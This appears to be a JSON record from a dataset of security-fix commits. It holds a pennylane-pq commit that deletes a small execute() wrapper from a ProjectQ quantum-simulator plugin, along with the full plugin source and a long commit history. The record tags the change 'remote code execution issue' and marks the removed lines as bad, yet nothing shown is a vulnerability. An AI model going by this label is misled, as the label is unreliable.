moment\r\nfixed names of single qubit measurements\r\n\r\n* new gates now working: SqrtX, Swap, SqrtSwap, Rx, Ry, Rz\r\n\r\n* Most single and two qubit gates work now\r\n\r\n* Outsource discussion from paper to separate document. Resolve Christian's open paradox: The derivative rules do not work if a non-Gaussian gate follows the one we derive for.\r\n\r\n* Adapted Heisenberg trafo for phase gate to SF standard\r\n\r\n* minor change\r\n\r\n* chain rule in heisenberg picture\r\n\r\n* I agree with nathan's comment\r\n\r\n* added code and comments to demonstrate the deallocation issue with ProjectQ, simply run tests/test_plugins.py to trigger the error message\r\n\r\n* code cleanup and fixed many pylint errors\r\n\r\n* in the process of fixing the deallocation problem\r\n\r\n* deallocation issue more or less solved\r\n\r\n* further cleanup and docstrings improved\r\n\r\n* classical backend now essentially work\r\n\r\n* fixed pass on of parameters to the IBMBackend\r\n\r\n* IBMBackend now working up to login\r\n\r\n* added AllZ gate ane AllZ measurement as good as currently possible\r\n\r\n* remote circuit execution on IBMBeckend now works\r\n\r\n* finally made measure() almost work with the IBMBackend\r\n\r\n* improved qureg (de-)allocation to make all backend happy at the same time\r\ncommented out the code that is suppose to estimate expectation values during measure() for the IBMBackend\r\n\r\n* first version in wich all tests pass with both the Simulator and the IBMBackend\r\n\r\n* implementation of execute() for Observables in the IBMBackend still missing\r\n\r\n* workaronud for measurements failing on trivial circuits added\r\ndo deallocation also for the IBMBackend as it needs it as well\r\nremoved debuggin output\r\nadded a proposal for a requires_credentials() method to the API that can be called to exclude certain backends from automated tests\r\n\r\n* all tests now run with the Simulator and IBMBackend\r\ncode cleanup and debut output removed\r\n\r\n* Classical backend now works\r\nmore demo circuits\r\n\r\n* removed the with Compute() statements\r\nminor cleanup\r\n\r\n* implemented methods for the new parameter pass on code\r\nreasonable cleaning of received paramters\r\nimproved __repr__() and __str__()\r\nwrite warnings to log instead of raising a warning\r\nmake requires_credentials() an instance method\r\n\r\n* moved projectQ plugin to new location to prepare putting it in separate module\r\n\r\n* adding license, readme and a few stub files\r\n\r\n* added __init__.py and an example which does not yet work\r\n\r\n* deleted the energy minimization example from openqml_pq\r\n\r\n* started editing the plugin to adopt it the API changes\r\n\r\n* adopted openqml imports in ProjectQ plugin\r\nadded _version.py\r\n\r\n* miving around code\r\n\r\n* new style mapping for gates and observables\r\n\r\n* untangling the parts of the ProjectQ plugin for the different ProjectQ backends\r\n\r\n* moved initialization of engine and reg to __init__()\r\n\r\n* implementing measurement logic\r\n\r\n* moved initialization to reset() to play according to the rules of the new API\r\nfirst version that successfully runs the example\r\n\r\n* added check for user and password in the ibm backend\r\nadded code to example to read user and password from command line\r\n\r\n* implementing measure() for the ibm backend\r\nfixed docstrings\r\n\r\n* allow the use of different optimizers in the example\r\n\r\n* moved conversion from gate names to gates into apply()\r\nadded some default options for testing the ibm backend\r\n\r\n* do not call reset() manually as it is superfluous\r\n\r\n* renamed measure() to expectation()\r\nfixed typo in call to backend.get_probabilities\r\n\r\n* make plugins overwrite execute_queued(), a function returning a value and not directly the user function execute(), which now calls execute_queued() and stores the result in self._out, which is an implementation detail and should be hidden from the user/plugin developer\r\nimplements the first suggestion from #18"}}, "https://github.com/XanaduAI/pennylane-pq": {"a38a05b5c0061840737e1f0ac9c1fc3ad5f4d7ef": {"url": "https://api.github.com/repos/XanaduAI/pennylane-pq/commits/a38a05b5c0061840737e1f0ac9c1fc3ad5f4d7ef", "html_url": "https://github.com/XanaduAI/pennylane-pq/commit/a38a05b5c0061840737e1f0ac9c1fc3ad5f4d7ef", "sha": "a38a05b5c0061840737e1f0ac9c1fc3ad5f4d7ef", "keyword": "remote code execution issue", "diff": "diff --git a/openqml_pq/projectq.py b/openqml_pq/projectq.py\nindex 11517e8..4cac149 100644\n--- a/openqml_pq/projectq.py\n+++ b/openqml_pq/projectq.py\n@@ -149,11 +149,6 @@ def __str__(self):\n     # def __del__(self):\n     #     self._deallocate()\n \n-    def execute(self):\n-        \"\"\" \"\"\"\n-        #todo: I hope this function will become superfluous, see https://github.com/XanaduAI/openqml/issues/18\n-        self._out = self.execute_queued()\n-\n     def execute_queued(self):\n         \"\"\"Apply the queued operations to the device, and measure the expectation.\"\"\"\n         #expectation_values = {}\n", "message": "", "files": {"/openqml_pq/projectq.py": {"changes": [{"diff": "\n     # def __del__(self):\n     #     self._deallocate()\n \n-    def execute(self):\n-        \"\"\" \"\"\"\n-        #todo: I hope this function will become superfluous, see https://github.com/XanaduAI/openqml/issues/18\n-        self._out = self.execute_queued()\n-\n     def execute_queued(self):\n         \"\"\"Apply the queued operations to the device, and measure the expectation.\"\"\"\n         #expectation_values = {}\n", "add": 0, "remove": 5, "filename": "/openqml_pq/projectq.py", "badparts": ["    def execute(self):", "        \"\"\" \"\"\"", "        self._out = self.execute_queued()"], "goodparts": []}], "source": "\n r\"\"\" ProjectQ plugin ======================== **Module name:**:mod:`openqml.plugins.projectq` .. currentmodule:: openqml.plugins.projectq This plugin provides the interface between OpenQML and ProjecQ. It enables OpenQML to optimize quantum circuits simulable with ProjectQ. ProjecQ supports several different backends. Of those, the following are useful in the current context: -projectq.backends.Simulator([gate_fusion,...])\tSimulator is a compiler engine which simulates a quantum computer using C++-based kernels. -projectq.backends.ClassicalSimulator()\t A simple introspective simulator that only permits classical operations. -projectq.backends.IBMBackend([use_hardware,...])\tThe IBM Backend class, which stores the circuit, transforms it to JSON QASM, and sends the circuit through the IBM API. See PluginAPI._capabilities['backend'] for a list of backend options. Functions --------- .. autosummary:: init_plugin Classes ------- .. autosummary:: Gate Observable PluginAPI ---- \"\"\" import logging as log import numpy as np from numpy.random import(randn,) from openqml import Device, DeviceError from openqml import Variable import projectq as pq import projectq.setups.ibm from projectq.ops import(HGate, XGate, YGate, ZGate, SGate, TGate, SqrtXGate, SwapGate, SqrtSwapGate, Rx, Ry, Rz, R) from.ops import(CNOT, CZ, Toffoli, AllZGate, Rot, Hermitian) from._version import __version__ operator_map={ 'PauliX': XGate, 'PauliY': YGate, 'PauliZ': ZGate, 'CNOT': CNOT, 'CZ': CZ, 'SWAP': SwapGate, 'RX': Rx, 'RY': Ry, 'RZ': Rz, 'Rot': Rot, } class ProjectQDevice(Device): \"\"\"ProjectQ device for OpenQML. Args: wires(int): The number of qubits of the device. Keyword Args for Simulator backend: gate_fusion(bool): If True, gates are cached and only executed once a certain gate-size has been reached(only has an effect for the c++simulator). rnd_seed(int): Random seed(uses random.randint(0, 4294967295) by default). Keyword Args for IBMBackend backend: use_hardware(bool): If True, the code is run on the IBM quantum chip(instead of using the IBM simulator) num_runs(int): Number of runs to collect statistics.(default is 1024) verbose(bool): If True, statistics are printed, in addition to the measurement result being registered(at the end of the circuit). user(string): IBM Quantum Experience user name password(string): IBM Quantum Experience password device(string): Device to use(\u2018ibmqx4\u2019, or \u2018ibmqx5\u2019) if use_hardware is set to True. Default is ibmqx4. retrieve_execution(int): Job ID to retrieve instead of re-running the circuit(e.g., if previous run timed out). \"\"\" name='ProjectQ OpenQML plugin' short_name='projectq' api_version='0.1.0' plugin_version=__version__ author='Christian Gogolin' _capabilities={'backend': list([\"Simulator\", \"ClassicalSimulator\", \"IBMBackend\"])} def __init__(self, wires, **kwargs): kwargs.setdefault('shots', 0) super().__init__(self.short_name, kwargs['shots']) for k,v in{'log':'verbose'}.items(): if k in kwargs: kwargs.setdefault(v, kwargs[k]) if 'num_runs' in kwargs: if isinstance(kwargs['num_runs'], int) and kwargs['num_runs']>0: self.n_eval=kwargs['num_runs'] else: self.n_eval=0 del(kwargs['num_runs']) self.wires=wires self.backend=kwargs['backend'] del(kwargs['backend']) self.kwargs=kwargs self.eng=None self.reg=None def reset(self): self.reg=self.eng.allocate_qureg(self.wires) def __repr__(self): return super().__repr__() +'Backend: ' +self.backend +'\\n' def __str__(self): return super().__str__() +'Backend: ' +self.backend +'\\n' def execute(self): \"\"\" \"\"\" self._out=self.execute_queued() def execute_queued(self): \"\"\"Apply the queued operations to the device, and measure the expectation.\"\"\" for operation in self._queue: if operation.name not in operator_map: raise DeviceError(\"{} not supported by device{}\".format(operation.name, self.short_name)) par=[x.val if isinstance(x, Variable) else x for x in operation.params] self.apply(operation.name, operation.wires, *par) result=self.expectation(self._observe.name, self._observe.wires) self._deallocate() return result def apply(self, gate_name, wires, *par): if gate_name not in self._gates: raise ValueError('Gate{} not supported on this backend'.format(gate)) gate=operator_map[gate_name](*par) if isinstance(wires, int): gate | self.reg[wires] else: gate | tuple([self.reg[i] for i in wires]) def expectation(self, observable, wires): raise NotImplementedError(\"expectation() is not yet implemented for this backend\") def shutdown(self): \"\"\"Shutdown. \"\"\" pass def _deallocate(self): \"\"\"Deallocate all qubits to make ProjectQ happy See also: https://github.com/ProjectQ-Framework/ProjectQ/issues/2 Drawback: This is probably rather resource intensive. \"\"\" if self.eng is not None and self.backend=='Simulator' or self.backend=='IBMBackend': pq.ops.All(pq.ops.Measure) | self.reg def _deallocate2(self): \"\"\"Another proposal for how to deallocate all qubits to make ProjectQ happy Unsuitable because: Produces a segmentation fault. \"\"\" if self.eng is not None and self.backend=='Simulator' or self.backend=='IBMBackend': for qubit in self.reg: self.eng.deallocate_qubit(qubit) def _deallocate3(self): \"\"\"Another proposal for how to deallocate all qubits to make ProjectQ happy Unsuitable because: Throws an error if the probability for the given collapse is 0. \"\"\" if self.eng is not None and self.backend=='Simulator' or self.backend=='IBMBackend': self.eng.flush() self.eng.backend.collapse_wavefunction(self.reg,[0 for i in range(len(self.reg))]) def filter_kwargs_for_backend(self, kwargs): return{ key:value for key,value in kwargs.items() if key in self._backend_kwargs} class ProjectQSimulator(ProjectQDevice): \"\"\"ProjectQ Simulator device for OpenQML. Args: wires(int): The number of qubits of the device. Keyword Args: gate_fusion(bool): If True, gates are cached and only executed once a certain gate-size has been reached(only has an effect for the c++simulator). rnd_seed(int): Random seed(uses random.randint(0, 4294967295) by default). \"\"\" short_name='projectq.simulator' _gates=set(operator_map.keys()) _observables=set([ key for(key,val) in operator_map.items() if val in[XGate, YGate, ZGate, AllZGate, Hermitian]]) _circuits={} _backend_kwargs=['gate_fusion', 'rnd_seed'] def __init__(self, wires, **kwargs): kwargs['backend']='Simulator' super().__init__(wires, **kwargs) def reset(self): \"\"\"Resets the engine and backend After the reset the Device should be as if it was just constructed. Most importantly the quantum state is reset to its initial value. \"\"\" backend=pq.backends.Simulator(**self.filter_kwargs_for_backend(self.kwargs)) self.eng=pq.MainEngine(backend) super().reset() def expectation(self, observable, wires): self.eng.flush(deallocate_qubits=False) if observable=='PauliX' or observable=='PauliY' or observable=='PauliZ': expectation_value=self.eng.backend.get_expectation_value(pq.ops.QubitOperator(str(observable)[-1]+'0'), self.reg) variance=1 -expectation_value**2 elif observable=='AllPauliZ': expectation_value=[ self.eng.backend.get_expectation_value(pq.ops.QubitOperator(\"Z\"+'0'),[qubit]) for qubit in self.reg] variance=[1 -e**2 for e in expectation_value] else: raise NotImplementedError(\"Estimation of expectation values not yet implemented for the observable{} in backend{}.\".format(observable, self.backend)) return expectation_value class ProjectQClassicalSimulator(ProjectQDevice): \"\"\"ProjectQ ClassicalSimulator device for OpenQML. Args: wires(int): The number of qubits of the device. \"\"\" short_name='projectq.classicalsimulator' _gates=set([ key for(key,val) in operator_map.items() if val in[XGate, CNOT]]) _observables=set([ key for(key,val) in operator_map.items() if val in[ZGate, AllZGate]]) _circuits={} _backend_kwargs=[] def __init__(self, wires, **kwargs): kwargs['backend']='ClassicalSimulator' super().__init__(wires, **kwargs) def reset(self): \"\"\"Resets the engine and backend After the reset the Device should be as if it was just constructed. Most importantly the quantum state is reset to its initial value. \"\"\" backend=pq.backends.ClassicalSimulator(**self.filter_kwargs_for_backend(self.kwargs)) self.eng=pq.MainEngine(backend) super().reset() class ProjectQIBMBackend(ProjectQDevice): \"\"\"ProjectQ IBMBackend device for OpenQML. Args: wires(int): The number of qubits of the device. Keyword Args: use_hardware(bool): If True, the code is run on the IBM quantum chip(instead of using the IBM simulator) num_runs(int): Number of runs to collect statistics.(default is 1024) verbose(bool): If True, statistics are printed, in addition to the measurement result being registered(at the end of the circuit). user(string): IBM Quantum Experience user name password(string): IBM Quantum Experience password device(string): Device to use(\u2018ibmqx4\u2019, or \u2018ibmqx5\u2019) if use_hardware is set to True. Default is ibmqx4. retrieve_execution(int): Job ID to retrieve instead of re-running the circuit(e.g., if previous run timed out). \"\"\" short_name='projectq.ibmbackend' _gates=set([ key for(key,val) in operator_map.items() if val in[HGate, XGate, YGate, ZGate, SGate, TGate, SqrtXGate, SwapGate, Rx, Ry, Rz, R, CNOT, CZ]]) _observables=set([ key for(key,val) in operator_map.items() if val in[ZGate, AllZGate]]) _circuits={} _backend_kwargs=['use_hardware', 'num_runs', 'verbose', 'user', 'password', 'device', 'retrieve_execution'] def __init__(self, wires, **kwargs): if 'user' not in kwargs: raise ValueError('An IBM Quantum Experience user name specified via the \"user\" keyword argument is required') if 'password' not in kwargs: raise ValueError('An IBM Quantum Experience password specified via the \"password\" keyword argument is required') kwargs['backend']='IBMBackend' super().__init__(wires, **kwargs) def reset(self): \"\"\"Resets the engine and backend After the reset the Device should be as if it was just constructed. Most importantly the quantum state is reset to its initial value. \"\"\" backend=pq.backends.IBMBackend(**self.filter_kwargs_for_backend(self.kwargs)) self.eng=pq.MainEngine(backend, engine_list=pq.setups.ibm.get_engine_list()) super().reset() def expectation(self, observable, wires): pq.ops.R(0) | self.reg[0] pq.ops.All(pq.ops.Measure) | self.reg self.eng.flush() if observable=='PauliZ': probabilities=self.eng.backend.get_probabilities([self.reg[wires]]) if '1' in probabilities: expectation_value=2*probabilities['1']-1 else: expectation_value=-(2*probabilities['0']-1) variance=1 -expectation_value**2 elif observable=='AllPauliZ': probabilities=self.eng.backend.get_probabilities(self.reg) expectation_value=[((2*sum(p for(state,p) in probabilities.items() if state[i]=='1')-1)-(2*sum(p for(state,p) in probabilities.items() if state[i]=='0')-1)) for i in range(len(self.reg))] variance=[1 -e**2 for e in expectation_value] else: raise NotImplementedError(\"Estimation of expectation values not yet implemented for the observable{} in backend{}.\".format(observable, self.backend)) return expectation_value ", "sourceWithComments": "# Copyright 2018 Xanadu Quantum Technologies Inc.\n\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n\n#     http://www.apache.org/licenses/LICENSE-2.0\n\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\nr\"\"\"\nProjectQ plugin\n========================\n\n**Module name:** :mod:`openqml.plugins.projectq`\n\n.. currentmodule:: openqml.plugins.projectq\n\nThis plugin provides the interface between OpenQML and ProjecQ.\nIt enables OpenQML to optimize quantum circuits simulable with ProjectQ.\n\nProjecQ supports several different backends. Of those, the following are useful in the current context:\n\n- projectq.backends.Simulator([gate_fusion, ...])\tSimulator is a compiler engine which simulates a quantum computer using C++-based kernels.\n- projectq.backends.ClassicalSimulator()\t        A simple introspective simulator that only permits classical operations.\n- projectq.backends.IBMBackend([use_hardware, ...])\tThe IBM Backend class, which stores the circuit, transforms it to JSON QASM, and sends the circuit through the IBM API.\n\nSee PluginAPI._capabilities['backend'] for a list of backend options.\n\nFunctions\n---------\n\n.. autosummary::\n   init_plugin\n\nClasses\n-------\n\n.. autosummary::\n   Gate\n   Observable\n   PluginAPI\n\n----\n\"\"\"\nimport logging as log\nimport numpy as np\nfrom numpy.random import (randn,)\nfrom openqml import Device, DeviceError\nfrom openqml import Variable\n\nimport projectq as pq\nimport projectq.setups.ibm #todo only import this if necessary\n\n# import operations\nfrom projectq.ops import (HGate, XGate, YGate, ZGate, SGate, TGate, SqrtXGate, SwapGate, SqrtSwapGate, Rx, Ry, Rz, R)\nfrom .ops import (CNOT, CZ, Toffoli, AllZGate, Rot, Hermitian)\n\nfrom ._version import __version__\n\n\noperator_map = {\n    'PauliX': XGate,\n    'PauliY': YGate,\n    'PauliZ': ZGate,\n    'CNOT': CNOT,\n    'CZ': CZ,\n    'SWAP': SwapGate,\n    'RX': Rx,\n    'RY': Ry,\n    'RZ': Rz,\n    'Rot': Rot,\n    #'PhaseShift': #todo: implement\n    #'QubitStateVector': #todo: implement\n    #'QubitUnitary': #todo: implement\n    #: H, #todo: implement\n    #: S, #todo: implement\n    #: T, #todo: implement\n    #: SqrtX, #todo: implement\n    #: SqrtSwap, #todo: implement\n    #: R, #todo: implement\n    #'AllPauliZ': AllZGate, #todo: implement\n    #'Hermitian': #todo: implement\n}\n\nclass ProjectQDevice(Device):\n    \"\"\"ProjectQ device for OpenQML.\n\n    Args:\n       wires (int): The number of qubits of the device.\n\n    Keyword Args for Simulator backend:\n      gate_fusion (bool): If True, gates are cached and only executed once a certain gate-size has been reached (only has an effect for the c++ simulator).\n      rnd_seed (int): Random seed (uses random.randint(0, 4294967295) by default).\n\n    Keyword Args for IBMBackend backend:\n      use_hardware (bool): If True, the code is run on the IBM quantum chip (instead of using the IBM simulator)\n      num_runs (int): Number of runs to collect statistics. (default is 1024)\n      verbose (bool): If True, statistics are printed, in addition to the measurement result being registered (at the end of the circuit).\n      user (string): IBM Quantum Experience user name\n      password (string): IBM Quantum Experience password\n      device (string): Device to use (\u2018ibmqx4\u2019, or \u2018ibmqx5\u2019) if use_hardware is set to True. Default is ibmqx4.\n      retrieve_execution (int): Job ID to retrieve instead of re-running the circuit (e.g., if previous run timed out).\n    \"\"\"\n    name = 'ProjectQ OpenQML plugin'\n    short_name = 'projectq'\n    api_version = '0.1.0'\n    plugin_version = __version__\n    author = 'Christian Gogolin'\n    _capabilities = {'backend': list([\"Simulator\", \"ClassicalSimulator\", \"IBMBackend\"])}\n\n    def __init__(self, wires, **kwargs):\n        kwargs.setdefault('shots', 0)\n        super().__init__(self.short_name, kwargs['shots'])\n\n        # translate some aguments\n        for k,v in {'log':'verbose'}.items():\n            if k in kwargs:\n                kwargs.setdefault(v, kwargs[k])\n\n        # clean some arguments\n        if 'num_runs' in kwargs:\n            if isinstance(kwargs['num_runs'], int) and kwargs['num_runs']>0:\n                self.n_eval = kwargs['num_runs']\n            else:\n                self.n_eval = 0\n                del(kwargs['num_runs'])\n\n        self.wires = wires\n        self.backend = kwargs['backend']\n        del(kwargs['backend'])\n        self.kwargs = kwargs\n        self.eng = None\n        self.reg = None\n        #self.reset() #the actual initialization is done in reset(), but we don't need to call this manually as Device does it for us during __enter__()\n\n    def reset(self):\n        self.reg = self.eng.allocate_qureg(self.wires)\n\n    def __repr__(self):\n        return super().__repr__() +'Backend: ' +self.backend +'\\n'\n\n    def __str__(self):\n        return super().__str__() +'Backend: ' +self.backend +'\\n'\n\n    # def __del__(self):\n    #     self._deallocate()\n\n    def execute(self):\n        \"\"\" \"\"\"\n        #todo: I hope this function will become superfluous, see https://github.com/XanaduAI/openqml/issues/18\n        self._out = self.execute_queued()\n\n    def execute_queued(self):\n        \"\"\"Apply the queued operations to the device, and measure the expectation.\"\"\"\n        #expectation_values = {}\n        for operation in self._queue:\n            if operation.name not in operator_map:\n                raise DeviceError(\"{} not supported by device {}\".format(operation.name, self.short_name))\n\n            par = [x.val if isinstance(x, Variable) else x for x in operation.params]\n            #expectation_values[tuple(operation.wires)] = self.apply(operator_map[operation.name](*p), self.reg, operation.wires)\n            self.apply(operation.name, operation.wires, *par)\n\n        result = self.expectation(self._observe.name, self._observe.wires)\n        self._deallocate()\n        return result\n\n        # if self._observe.wires is not None:\n        #     if isinstance(self._observe.wires, int):\n        #         return expectation_values[tuple([self._observe.wires])]\n        #     else:\n        #         return np.array([expectation_values[tuple([idx])] for idx in self._observe.wires if tuple([idx]) in expectation_values])\n\n    def apply(self, gate_name, wires, *par):\n        if gate_name not in self._gates:\n            raise ValueError('Gate {} not supported on this backend'.format(gate))\n\n        gate = operator_map[gate_name](*par)\n        if isinstance(wires, int):\n            gate | self.reg[wires]\n        else:\n            gate | tuple([self.reg[i] for i in wires])\n\n    def expectation(self, observable, wires):\n        raise NotImplementedError(\"expectation() is not yet implemented for this backend\")\n\n    def shutdown(self):\n        \"\"\"Shutdown.\n\n        \"\"\"\n        pass\n\n    def _deallocate(self):\n        \"\"\"Deallocate all qubits to make ProjectQ happy\n\n        See also: https://github.com/ProjectQ-Framework/ProjectQ/issues/2\n\n        Drawback: This is probably rather resource intensive.\n        \"\"\"\n        if self.eng is not None and self.backend == 'Simulator' or self.backend == 'IBMBackend':\n            pq.ops.All(pq.ops.Measure) | self.reg #avoid an unfriendly error message: https://github.com/ProjectQ-Framework/ProjectQ/issues/2\n\n    def _deallocate2(self):\n        \"\"\"Another proposal for how to deallocate all qubits to make ProjectQ happy\n\n        Unsuitable because: Produces a segmentation fault.\n        \"\"\"\n        if self.eng is not None and self.backend == 'Simulator' or self.backend == 'IBMBackend':\n             for qubit in self.reg:\n                 self.eng.deallocate_qubit(qubit)\n\n    def _deallocate3(self):\n        \"\"\"Another proposal for how to deallocate all qubits to make ProjectQ happy\n\n        Unsuitable because: Throws an error if the probability for the given collapse is 0.\n        \"\"\"\n        if self.eng is not None and self.backend == 'Simulator' or self.backend == 'IBMBackend':\n            self.eng.flush()\n            self.eng.backend.collapse_wavefunction(self.reg, [0 for i in range(len(self.reg))])\n\n\n    # def requires_credentials(self):\n    #     \"\"\"Check whether this plugin requires credentials\n    #     \"\"\"\n    #     if self.backend == 'IBMBackend':\n    #         return True\n    #     else:\n    #         return False\n\n\n    def filter_kwargs_for_backend(self, kwargs):\n        return { key:value for key,value in kwargs.items() if key in self._backend_kwargs }\n\n\nclass ProjectQSimulator(ProjectQDevice):\n    \"\"\"ProjectQ Simulator device for OpenQML.\n\n    Args:\n       wires (int): The number of qubits of the device.\n\n    Keyword Args:\n      gate_fusion (bool): If True, gates are cached and only executed once a certain gate-size has been reached (only has an effect for the c++ simulator).\n      rnd_seed (int): Random seed (uses random.randint(0, 4294967295) by default).\n    \"\"\"\n\n    short_name = 'projectq.simulator'\n    _gates = set(operator_map.keys())\n    _observables = set([ key for (key,val) in operator_map.items() if val in [XGate, YGate, ZGate, AllZGate, Hermitian] ])\n    _circuits = {}\n    _backend_kwargs = ['gate_fusion', 'rnd_seed']\n\n    def __init__(self, wires, **kwargs):\n        kwargs['backend'] = 'Simulator'\n        super().__init__(wires, **kwargs)\n\n    def reset(self):\n        \"\"\"Resets the engine and backend\n\n        After the reset the Device should be as if it was just constructed.\n        Most importantly the quantum state is reset to its initial value.\n        \"\"\"\n        backend = pq.backends.Simulator(**self.filter_kwargs_for_backend(self.kwargs))\n        self.eng = pq.MainEngine(backend)\n        super().reset()\n\n\n    def expectation(self, observable, wires):\n        self.eng.flush(deallocate_qubits=False)\n        if observable == 'PauliX' or observable == 'PauliY' or observable == 'PauliZ':\n            expectation_value = self.eng.backend.get_expectation_value(pq.ops.QubitOperator(str(observable)[-1]+'0'), self.reg)\n            variance = 1 - expectation_value**2\n        elif observable == 'AllPauliZ':\n            expectation_value = [ self.eng.backend.get_expectation_value(pq.ops.QubitOperator(\"Z\"+'0'), [qubit]) for qubit in self.reg]\n            variance = [1 - e**2 for e in expectation_value]\n        else:\n            raise NotImplementedError(\"Estimation of expectation values not yet implemented for the observable {} in backend {}.\".format(observable, self.backend))\n\n        return expectation_value#, variance\n\n\nclass ProjectQClassicalSimulator(ProjectQDevice):\n    \"\"\"ProjectQ ClassicalSimulator device for OpenQML.\n\n    Args:\n       wires (int): The number of qubits of the device.\n    \"\"\"\n\n    short_name = 'projectq.classicalsimulator'\n    _gates = set([ key for (key,val) in operator_map.items() if val in [XGate, CNOT] ])\n    _observables = set([ key for (key,val) in operator_map.items() if val in [ZGate, AllZGate] ])\n    _circuits = {}\n    _backend_kwargs = []\n\n    def __init__(self, wires, **kwargs):\n        kwargs['backend'] = 'ClassicalSimulator'\n        super().__init__(wires, **kwargs)\n\n    def reset(self):\n        \"\"\"Resets the engine and backend\n\n        After the reset the Device should be as if it was just constructed.\n        Most importantly the quantum state is reset to its initial value.\n        \"\"\"\n        backend = pq.backends.ClassicalSimulator(**self.filter_kwargs_for_backend(self.kwargs))\n        self.eng = pq.MainEngine(backend)\n        super().reset()\n\nclass ProjectQIBMBackend(ProjectQDevice):\n    \"\"\"ProjectQ IBMBackend device for OpenQML.\n\n    Args:\n       wires (int): The number of qubits of the device.\n\n    Keyword Args:\n      use_hardware (bool): If True, the code is run on the IBM quantum chip (instead of using the IBM simulator)\n      num_runs (int): Number of runs to collect statistics. (default is 1024)\n      verbose (bool): If True, statistics are printed, in addition to the measurement result being registered (at the end of the circuit).\n      user (string): IBM Quantum Experience user name\n      password (string): IBM Quantum Experience password\n      device (string): Device to use (\u2018ibmqx4\u2019, or \u2018ibmqx5\u2019) if use_hardware is set to True. Default is ibmqx4.\n      retrieve_execution (int): Job ID to retrieve instead of re-running the circuit (e.g., if previous run timed out).\n    \"\"\"\n\n    short_name = 'projectq.ibmbackend'\n    _gates = set([ key for (key,val) in operator_map.items() if val in [HGate, XGate, YGate, ZGate, SGate, TGate, SqrtXGate, SwapGate, Rx, Ry, Rz, R, CNOT, CZ] ])\n    _observables = set([ key for (key,val) in operator_map.items() if val in [ZGate, AllZGate] ])\n    _circuits = {}\n    _backend_kwargs = ['use_hardware', 'num_runs', 'verbose', 'user', 'password', 'device', 'retrieve_execution']\n\n    def __init__(self, wires, **kwargs):\n        # check that necessary arguments are given\n        if 'user' not in kwargs:\n            raise ValueError('An IBM Quantum Experience user name specified via the \"user\" keyword argument is required')\n        if 'password' not in kwargs:\n            raise ValueError('An IBM Quantum Experience password specified via the \"password\" keyword argument is required')\n\n        kwargs['backend'] = 'IBMBackend'\n        #kwargs['verbose'] = True #todo: remove when done testing\n        #kwargs['log'] = True #todo: remove when done testing\n        #kwargs['use_hardware'] = False #todo: remove when done testing\n        #kwargs['num_runs'] = 3 #todo: remove when done testing\n        super().__init__(wires, **kwargs)\n\n    def reset(self):\n        \"\"\"Resets the engine and backend\n\n        After the reset the Device should be as if it was just constructed.\n        Most importantly the quantum state is reset to its initial value.\n        \"\"\"\n        backend = pq.backends.IBMBackend(**self.filter_kwargs_for_backend(self.kwargs))\n        self.eng = pq.MainEngine(backend, engine_list=pq.setups.ibm.get_engine_list())\n        super().reset()\n\n    def expectation(self, observable, wires):\n        pq.ops.R(0) | self.reg[0]# todo:remove this once https://github.com/ProjectQ-Framework/ProjectQ/issues/259 is resolved\n\n        pq.ops.All(pq.ops.Measure) | self.reg\n        self.eng.flush()\n\n        if observable == 'PauliZ':\n            probabilities = self.eng.backend.get_probabilities([self.reg[wires]])\n            #print(\"IBM probabilities=\"+str(probabilities))\n            if '1' in probabilities:\n                expectation_value = 2*probabilities['1']-1\n            else:\n                expectation_value = -(2*probabilities['0']-1)\n            variance = 1 - expectation_value**2\n        elif observable == 'AllPauliZ':\n            probabilities = self.eng.backend.get_probabilities(self.reg)\n            #print(\"IBM all probabilities=\"+str(probabilities))\n            expectation_value = [ ((2*sum(p for (state,p) in probabilities.items() if state[i] == '1')-1)-(2*sum(p for (state,p) in probabilities.items() if state[i] == '0')-1)) for i in range(len(self.reg)) ]\n            variance = [1 - e**2 for e in expectation_value]\n        else:\n            raise NotImplementedError(\"Estimation of expectation values not yet implemented for the observable {} in backend {}.\".format(observable, self.backend))\n\n        return expectation_value#, variance\n"}}, "msg": "Execute queued (#22)\n\n* added stub plugin file for the ProjectQ plugin\r\n\r\n* improved documentation and started coding\r\n\r\n* added gates and started modifying the implementation of the PluginAPI class\r\n\r\n* implemented initialization of engine\r\nfixed demo circuit\r\nfixed plugin name\r\nfixed typo in initialization of _capabilities\r\n\r\n* fixed gates and disabled some more \"problematic\" gates for now\r\n\r\n* implemented circuit execution and expectation value collection\r\nadded MeasureX, Y, and Z\r\n\r\n* use pq Compute() and Uncompute() to during execution\r\nmade demo circuits compatible with those of the SF plugin to make tests run more easiliy\r\n\r\n* first version that passes all tests for the standard Simulator backend\r\n\r\n* trying to get multi qubit gates to work\r\nexplained why only the Simulator backend can be enabled at the moment\r\nfixed names of single qubit measurements\r\n\r\n* new gates now working: SqrtX, Swap, SqrtSwap, Rx, Ry, Rz\r\n\r\n* Most single and two qubit gates work now\r\n\r\n* Outsource discussion from paper to separate document. Resolve Christian's open paradox: The derivative rules do not work if a non-Gaussian gate follows the one we derive for.\r\n\r\n* Adapted Heisenberg trafo for phase gate to SF standard\r\n\r\n* minor change\r\n\r\n* chain rule in heisenberg picture\r\n\r\n* I agree with nathan's comment\r\n\r\n* added code and comments to demonstrate the deallocation issue with ProjectQ, simply run tests/test_plugins.py to trigger the error message\r\n\r\n* code cleanup and fixed many pylint errors\r\n\r\n* in the process of fixing the deallocation problem\r\n\r\n* deallocation issue more or less solved\r\n\r\n* further cleanup and docstrings improved\r\n\r\n* classical backend now essentially work\r\n\r\n* fixed pass on of parameters to the IBMBackend\r\n\r\n* IBMBackend now working up to login\r\n\r\n* added AllZ gate ane AllZ measurement as good as currently possible\r\n\r\n* remote circuit execution on IBMBeckend now works\r\n\r\n* finally made measure() almost work with the IBMBackend\r\n\r\n* improved qureg (de-)allocation to make all backend happy at the same time\r\ncommented out the code that is suppose to estimate expectation values during measure() for the IBMBackend\r\n\r\n* first version in wich all tests pass with both the Simulator and the IBMBackend\r\n\r\n* implementation of execute() for Observables in the IBMBackend still missing\r\n\r\n* workaronud for measurements failing on trivial circuits added\r\ndo deallocation also for the IBMBackend as it needs it as well\r\nremoved debuggin output\r\nadded a proposal for a requires_credentials() method to the API that can be called to exclude certain backends from automated tests\r\n\r\n* all tests now run with the Simulator and IBMBackend\r\ncode cleanup and debut output removed\r\n\r\n* Classical backend now works\r\nmore demo circuits\r\n\r\n* removed the with Compute() 